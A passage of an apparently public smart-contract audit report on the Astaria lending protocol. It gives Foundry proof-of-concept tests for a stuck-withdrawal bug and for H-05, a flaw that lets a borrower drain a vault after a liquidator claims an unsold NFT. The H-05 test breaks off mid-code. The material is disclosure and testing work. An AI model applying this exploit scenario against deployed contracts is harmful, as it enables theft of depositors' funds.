0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>src\\test\\AstariaTest.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPrivateVaultStrategistIsUnableToWithdraw</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPrivateVault</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">delegate:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistTwo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// strategistOne deposits 50 ether WETH to privateVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">, </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// calling router&#39;s withdraw function for withdrawing assets from privateVault reverts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;APPROVE_FAILED&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC4626</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// directly withdrawing various asset amounts from privateVault also fails</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TRANSFER_FROM_FAILED&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amountToLend</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TRANSFER_FROM_FAILED&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privateVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L72</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/489\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-05-vault-may-be-drained-after-a-liquidated-nft-was-claimed-by-the-liquidator\" style=\"position:relative;\"><a href=\"#h-05-vault-may-be-drained-after-a-liquidated-nft-was-claimed-by-the-liquidator\" aria-label=\"h 05 vault may be drained after a liquidated nft was claimed by the liquidator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/480\">[H-05] Vault may be drained after a liquidated NFT was claimed by the liquidator</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/480\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/285\">obront</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/196\">HE1M</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231</a></p>\n<p>The owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>There’s an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by calling <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109\">CollateralToken.liquidatorNFTClaim</a>. The function:</p>\n<ol>\n<li>calls <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220\">ClearingHouse.settleLiquidatorNFTClaim</a> to burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids);</li>\n<li><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L352\">releases the collateral NFT to the liquidator</a>.</li>\n</ol>\n<p>However, the function doesn’t settle the auction. As a result:</p>\n<ol>\n<li>the <code>CollateralToken</code> is not burned (<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538\">CollateralToken.sol#L538</a>);</li>\n<li>the link between the collateral ID and the underlying token is not removed (<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537\">CollateralToken.sol#L537</a>);</li>\n<li>the link between the collateral ID and the auction is also not removed (<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544\">CollateralToken.sol#L544</a>).</li>\n</ol>\n<p>This allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.</p>\n<p><strong>Exploit Scenario</strong></p>\n<ol>\n<li>Alice deposits an NFT token as a collateral and takes a loan.</li>\n<li>Alice’s loan expires and her NFT collateral gets liquidated by Bob.</li>\n<li>The collateral NFT wasn’t sold off auction as there were no bids.</li>\n<li>Bob claims the collateral NFT and receives it.</li>\n<li>Alice takes another loan from the vault without providing any collateral.</li>\n</ol>\n<p>The following PoC demonstrates the above scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// src/test/AstariaTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testAuctionEndNoBidsMismanagement_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TestNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestNFT</span><span class=\"mtk1\">(</span><span class=\"mtk7\">6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Creating a public vault and providing some liquidity.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPublicVault</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">delegate:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistTwo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">epochLength:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_lendToVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Lender</span><span class=\"mtk1\">({</span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bob</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountToLend:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">150</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}), </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (, </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_commitToLien</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blueChipDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">isFirstLien:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">11</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Liquidator liquidates the loan after expiration.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x123</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">listedOrder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ASTARIA_ROUTER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Skipping the auction duration and making no bids.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Liquidator claims the liquidated NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">liquidatorNFTClaim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">listedOrder</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">processEpoch</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Liquidator is the rightful owner of the collateral NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Since the auction wasn&#39;t fully settled, the CollateralToken still exists for the collateral NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// The borrower is the owner of the CollateralToken.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">COLLATERAL_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// WETH balances at this moment:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 1. the borrower keep holding the 100 ETH it borrowed earlier;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// 2. the vault keeps holding 50 ETH of liquidity.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 